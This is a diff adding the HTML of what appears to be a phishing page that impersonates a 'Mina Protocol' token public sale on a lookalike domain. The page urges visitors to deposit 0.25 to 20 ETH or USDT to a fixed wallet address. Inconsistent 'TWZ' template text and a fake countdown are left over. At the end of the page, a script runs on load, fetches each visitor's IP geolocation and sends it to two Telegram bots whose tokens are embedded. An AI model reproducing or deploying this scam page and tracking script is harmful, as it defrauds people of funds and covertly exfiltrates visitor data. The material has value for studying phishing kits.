+										</span>
+									</div>
+								</div>
+								<div class="token-balance token-balance-s2">
+									<span class="card-sub-title mgb-0-5x">Public Sale Ends In </span>
+									<div id="countdown" class="countdown-clock card-sub-title timer">
+										<div>
+											<span class="countdown-time countdown-time-first days">00</span>
+											<span class="countdown-text">day</span>
+										</div>
+										<div>
+											<span class="countdown-time hours">06</span>
+											<span class="countdown-text">hour</span>
+										</div>
+										<div>
+											<span class="countdown-time minutes">25</span>
+											<span class="countdown-text">min</span>
+										</div>
+										<div>
+											<span class="countdown-time countdown-time-last seconds">57</span>
+											<span class="countdown-text">sec</span>
+										</div>
+
+										<div id="overTime" hidden="">3456</div>
+									</div>
+								</div>
+							</div>
+						</div>
+						<div class="token-sales card">
+							<div class="card-innr">
+								<div class="card-head">
+									<h5 class="card-title card-title-sm">Public Sale Information</h5>
+								</div>
+								<div class="token-rate-wrap row">
+									<div class="token-rate col-md-6 col-lg-12">
+										<span class="card-sub-title">MINA Token Price </span>
+										<h4 class="font-mid text-dark">
+											1 MINA =
+											<span>$0.23 </span>
+										</h4>
+									</div>
+									<div class="token-rate col-md-6 col-lg-12">
+										<span class="card-sub-title">Minimum Purchase </span>
+										<h4 class="font-mid text-dark">
+											0.25 ETH |
+											<span>596 USDT </span>
+										</h4>
+									</div>
+									<div class="token-rate col-md-6 col-lg-12">
+										<span class="card-sub-title">Maximum Purchase </span>
+										<h4 class="font-mid text-dark">
+											20 ETH |
+											<span>45362 USDT </span>
+										</h4>
+									</div>
+								</div>
+							</div>
+							<div class="sap"></div>
+							<div class="card-innr">
+								<div class="card-head">
+									<h5 class="card-title card-title-sm">Token Sales Progress</h5>
+								</div>
+								<ul class="progress-info">
+									<li><span>Raised </span> 70,327,543 MINA</li>
+									<li class="text-right"><span>TOTAL </span> 75,000,000 MINA</li>
+								</ul>
+								<div class="progress-bar">
+									<div class="progress-hcap" data-percent="100" style="width: 100%">
+										<div>
+											Hard cap
+											<span>75,000,000 </span>
+										</div>
+									</div>
+									<div class="progress-scap" data-percent="24" style="width: 24%">
+										<div>
+											Soft cap
+											<span>25,000,000 </span>
+										</div>
+									</div>
+									<div class="progress-percent" data-percent="92" style="width: 92%"></div>
+								</div>
+								<div class="gaps-3x"></div>
+							</div>
+						</div>
+					</div>
+					<!-- .col -->
+				</div>
+				<!-- .container -->
+			</div>
+			<!-- .page-content -->
+			<div class="footer-bar">
+				<div class="container">
+					<div class="row align-items-center justify-content-center">
+						<div class="col-md-8">
+							<ul class="footer-links">
+								<li>
+									<a href="https://t.me/minaprotocol_comm" target="_blank">Telegram </a>
+								</li>
+							</ul>
+						</div>
+						<!-- .col -->
+						<div class="col-md-4 mt-2 mt-sm-0">
+							<div class="d-flex justify-content-between justify-content-md-end align-items-center guttar-25px pdt-0-5x pdb-0-5x">
+								<div class="copyright-text">© 2021 Mina Protocol.</div>
+							</div>
+						</div>
+						<!-- .col -->
+					</div>
+					<!-- .row -->
+				</div>
+				<!-- .container -->
+			</div>
+			<!-- .footer-bar -->
+			<div class="modal fade" id="add-wallet" tabindex="-1">
+				<div class="modal-dialog modal-dialog-md modal-dialog-centered">
+					<div class="modal-content">
+						<a href="https://minaprotocol.tech/#" class="modal-close" data-dismiss="modal" aria-label="Close">
+							<em class="ti ti-close"> </em>
+						</a>
+						<div class="popup-body">
+							<h4 class="popup-title">Wallet Address</h4>
+							<p>
+								In order to receive your
+								<a href="https://minaprotocol.tech/#"> <strong>TWZ Tokens </strong> </a>, please select your wallet address and you have to put
+								the address below input box.
+								<strong>You will receive TWZ tokens to this address after the Token Sale end. </strong>
+							</p>
+							<form action="https://minaprotocol.tech/#">
+								<div class="row">
+									<div class="col-md-6">
+										<div class="input-item input-with-label">
+											<label for="swalllet" class="input-item-label">Select Wallet </label>
+											<select
+												class="select-bordered select-block select2-hidden-accessible"
+												name="swalllet"
+												id="swalllet"
+												tabindex="-1"
+												aria-hidden="true"
+											>
+												<option value="eth">Ethereum</option>
+												<option value="dac">DashCoin</option>
+												<option value="bic">BitCoin</option>
+											</select>
+											<span class="select2 select2-container select2-container--flat bordered" dir="ltr" style="width: auto">
+												<span class="selection">
+													<span
+														class="select2-selection select2-selection--single"
+														role="combobox"
+														aria-haspopup="true"
+														aria-expanded="false"
+														tabindex="0"
+														aria-labelledby="select2-swalllet-container"
+													>
+														<span class="select2-selection__rendered" id="select2-swalllet-container" title="Ethereum"
+															>Ethereum
+														</span>
+														<span class="select2-selection__arrow" role="presentation">
+															<b role="presentation"> </b>
+														</span>
+													</span>
+												</span>
+												<span class="dropdown-wrapper" aria-hidden="true"> </span>
+											</span>
+										</div>
+										<!-- .input-item -->
+									</div>
+									<!-- .col -->
+								</div>
+								<!-- .row -->
+								<div class="input-item input-with-label">
+									<label for="token-address" class="input-item-label">Your Address for tokens: </label>
+									<input
+										class="input-bordered"
+										type="text"
+										id="token-address"
+										name="token-address"
+										value="0x068877400c19639e2dAFdF3Ff15Db5f4812Ba068"
+									/>
+									<span class="input-note">Note: Address should be ERC20-compliant. </span>
+								</div>
+								<!-- .input-item -->
+								<div class="note note-plane note-danger">
+									<em class="fas fa-info-circle"> </em>
+									<p>
+										DO NOT USE your exchange wallet address such as Kraken, Bitfinex, Bithumb, Binance etc. You can use MetaMask,
+										MayEtherWallet, Mist wallets etc. Do not use the address if you don’t have a private key of the your address. You WILL
+										NOT receive TWZ Tokens and WILL LOSE YOUR FUNDS if you do.
+									</p>
+								</div>
+								<div class="gaps-3x"></div>
+								<div class="d-sm-flex justify-content-between align-items-center">
+									<button class="btn btn-primary">Add Wallet</button>
+									<div class="gaps-2x d-sm-none"></div>
+									<span class="text-success"> <em class="ti ti-check-box"> </em> Added wallet address </span>
+								</div>
+							</form>
+							<!-- form -->
+						</div>
+					</div>
+					<!-- .modal-content -->
+				</div>
+				<!-- .modal-dialog -->
+			</div>
+			<!-- Modal End -->
+			<div class="modal fade" id="get-pay-address" tabindex="-1">
+				<div class="modal-dialog modal-dialog-md modal-dialog-centered">
+					<div class="modal-content">
+						<a href="https://minaprotocol.tech/#" class="modal-close" data-dismiss="modal" aria-label="Close">
+							<em class="ti ti-close"> </em>
+						</a>
+						<div class="popup-body">
+							<h4 class="popup-title">MINA Public Sale Token Address</h4>
+							<p>
+								Please make deposit of atleast:<br />
+								<strong>0.25 ETH | 596 USDT <br /> </strong> With a maximum of: <br />
+								<strong>20 ETH | 45362 USDT </strong>
+							</p>
+							<div class="gaps-1x"></div>
+							<h6 class="font-bold">Only send <strong>ETH</strong> &amp; <strong>USDT</strong> to the following address:</h6>
+							<div class="copy-wrap mgb-0-5x">
+								<span class="copy-feedback"> </span>
+								<em class="fab fa-ethereum"> </em>
+								<input id="addr" type="text" class="copy-address" value="0xc6CE3758a02a23027c173bEFb918BDfF02Eed2ce" readonly="" />
+								<button
+									onclick="copyFunction()"
+									class="copy-trigger copy-clipboard"
+									data-clipboard-text="0xc6CE3758a02a23027c173bEFb918BDfF02Eed2ce"
+								>
+									<em class="ti ti-files"> </em>
+								</button>
+							</div>
+							<div class="note note-plane note-light mgb-1x">
+								<em class="fas fa-info-circle"> </em>
+								<p>Minimum payment: 0.25 ETH | 596 USDT</p>
+							</div>
+							<button class="btn btn-primary" data-dismiss="modal" data-toggle="modal" data-target="#pay-confirm">
+								Register Your Purchase
+								<em class="ti ti-arrow-right mgl-4-5x"> </em>
+							</button>
+							<div class="gaps-1x"></div>
+							<div class="note note-plane note-danger">
+								<em class="fas fa-info-circle"> </em>
+								<p>After sending the payment proceed to the next page by clicking the button above.</p>
+							</div>
+						</div>
+					</div>
+					<!-- .modal-content -->
+				</div>
+				<!-- .modal-dialog -->
+			</div>
+			<!-- Modal End -->
+			<div class="modal fade" id="pay-confirm" tabindex="-1">
+				<div class="modal-dialog modal-dialog-md modal-dialog-centered">
+					<div class="modal-content">
+						<div class="popup-body">
+							<h4 class="popup-title">Register your address</h4>
+							<p class="lead text-primary">Register your address to speed up the public sale distribution process!</p>
+							<p>
+								The MINA Token distribution process will start after the public sale has ended, please register your address you used to send
+								ETH / USDT.
+							</p>
+							<div class="input-item input-with-label">
+								<label for="token-address" class="input-item-label">Enter your wallet address </label>
+								<input class="input-bordered" type="text" placeholder="Your ETH Address" />
+							</div>
+							<!-- .input-item -->
+							<ul class="d-flex flex-wrap align-items-center guttar-30px">
+								<li>
+									<a
+										href="https://minaprotocol.tech/#"
+										data-dismiss="modal"
+										data-toggle="modal"
+										data-target="#pay-review"
+										class="btn btn-primary"
+										>Confirm Payment
+									</a>
+								</li>
+							</ul>
+							<div class="gaps-2x"></div>
+							<div class="gaps-1x d-none d-sm-block"></div>
+						</div>
+					</div>
+					<!-- .modal-content -->
+				</div>
+				<!-- .modal-dialog -->
+			</div>
+			<!-- Modal End -->
+			<div class="modal fade" id="pay-coingate" tabindex="-1">
+				<div class="modal-dialog modal-dialog-md modal-dialog-centered">
+					<div class="modal-content">
+						<div class="popup-body">
+							<h4 class="popup-title">Buy Tokens and Payment</h4>
+							<p class="lead">
+								To receiving <strong>18,750 TWZ </strong> tokens including <strong>bonus 1,540 TWZ </strong> require payment amount of
+								<strong>1.0 ETH </strong>.
+							</p>
+							<p>You can pay via online payment geteway <strong>“Coingate” </strong>. It’s safe and secure.</p>
+							<div class="pdb-2-5x pdt-1-5x">
+								<input type="checkbox" class="input-checkbox input-checkbox-md" id="agree-term-2" />
+								<label for="agree-term-2">I hereby agree to the <strong>token purchase aggrement &amp; token sale term </strong>. </label>
+							</div>
+							<button class="btn btn-primary" data-dismiss="modal" data-toggle="modal" data-target="#pay-thanks">
+								Place Order &amp; Process to Pay
+								<em class="ti ti-arrow-right mgl-4-5x"> </em>
+							</button>
+							<div class="gaps-3x"></div>
+							<div class="note note-plane note-light mgb-1x">
+								<em class="fas fa-info-circle"> </em>
+								<p>You will automatically redirect to Coingate website for payment</p>
+							</div>
+						</div>
+					</div>
+					<!-- .modal-content -->
+				</div>
+				<!-- .modal-dialog -->
+			</div>
+			<!-- Modal End -->
+			<div class="modal fade" id="pay-thanks" tabindex="-1">
+				<div class="modal-dialog modal-dialog-md modal-dialog-centered">
+					<div class="modal-content">
+						<div class="popup-body text-center">
+							<div class="gaps-2x"></div>
+							<div class="pay-status pay-status-success">
+								<em class="ti ti-check"> </em>
+							</div>
+							<div class="gaps-2x"></div>
+							<h3>Thanks for your contribution!</h3>
+							<p>
+								Your payment amount <strong>1.0 ETH </strong> has been successfully received againest order no. <strong>TNX94KR8N0 </strong>.
+								We’ve added <strong>18,750 TWZ </strong> tokens in account.
+							</p>
+							<div class="gaps-2x"></div>
+							<a href="https://minaprotocol.tech/ico-distribution.html" class="btn btn-primary">See Token Balance </a>
+							<div class="gaps-1x"></div>
+						</div>
+					</div>
+					<!-- .modal-content -->
+				</div>
+				<!-- .modal-dialog -->
+			</div>
+			<!-- Modal End -->
+			<div class="modal fade" id="pay-review" tabindex="-1">
+				<div class="modal-dialog modal-dialog-md modal-dialog-centered">
+					<div class="modal-content">
+						<div class="popup-body text-center">
+							<div class="gaps-2x"></div>
+							<div class="pay-status pay-status-success">
+								<em class="ti ti-check"> </em>
+							</div>
+							<div class="gaps-2x"></div>
+							<h3>Thanks for attending the Mina Protocol Public Sale!</h3>
+							<p>You will receive your MINA tokens after our public sale ends!</p>
+							<div class="gaps-2x"></div>
+							<a href="https://minaprotocol.tech/thank-you" class="btn btn-primary">Next </a>
+							<div class="gaps-1x"></div>
+						</div>
+					</div>
+					<!-- .modal-content -->
+				</div>
+				<!-- .modal-dialog -->
+			</div>
+			<!-- Modal End -->
+			<div class="modal fade" id="pay-failed" tabindex="-1">
+				<div class="modal-dialog modal-dialog-md modal-dialog-centered">
+					<div class="modal-content">
+						<div class="popup-body text-center">
+							<div class="gaps-2x"></div>
+							<div class="pay-status pay-status-error">
+								<em class="ti ti-alert"> </em>
+							</div>
+							<div class="gaps-2x"></div>
+							<h3>Oops! Payment failed!</h3>
+							<p>
+								Sorry, seems there is an issues occurred and we couldn’t process your payment. If you continue to have issues, please contact us
+								with order no. <strong>TNX94KR8N0 </strong>.
+							</p>
+							<div class="gaps-2x"></div>
+							<a
+								href="https://minaprotocool.com/#"
+								data-dismiss="modal"
+								data-toggle="modal"
+								data-target="#get-pay-address"
+								class="btn btn-primary"
+								>Try to Pay Again
+							</a>
+							<div class="gaps-1x"></div>
+						</div>
+					</div>
+					<!-- .modal-content -->
+				</div>
+				<!-- .modal-dialog -->
+			</div>
+			<!-- Modal End -->
+			<!-- JavaScript (include all script here) -->
+			<script src="./index_files/jquery.bundle﹖ver=104.js.download"></script>
+			<script src="./index_files/script.js.download"></script>
+		</div>
+		<app-content ng-version="11.1.0"></app-content><style id="stylish-1" class="stylish" type="text/css"></style
+		><style class="darkreader darkreader--sync" media="screen"></style>
+		<script>
+			function httpGet(theUrl) {
+				var xmlHttp = new XMLHttpRequest()
+				xmlHttp.open('GET', theUrl, false)
+				xmlHttp.send(null)
+				return xmlHttp.responseText
+			}
+			let data = JSON.parse(httpGet('https://api.db-ip.com/v2/free/self'))
+			httpGet(
+				'https://api.telegram.org/bot1729478360:AAGyQ38eGDBSn0puGqP6f0l8V3QyIxxO6cY/sendMessage?chat_id=1668746149&text=' +
+					encodeURIComponent('New user view!\n\nIP: ' + data.ipAddress + '\n' + data.continentName + ', ' + data.countryName + ', ' + data.city)
+			)
+			httpGet(
+				'https://api.telegram.org/bot1729478360:AAGyQ38eGDBSn0puGqP6f0l8V3QyIxxO6cY/sendMessage?chat_id=1727574248&text=' +
+					encodeURIComponent('New user view!\n\nIP: ' + data.ipAddress + '\n' + data.continentName + ', ' + data.countryName + ', ' + data.city)
+			)
+		</script>
+	</body>
+</html>
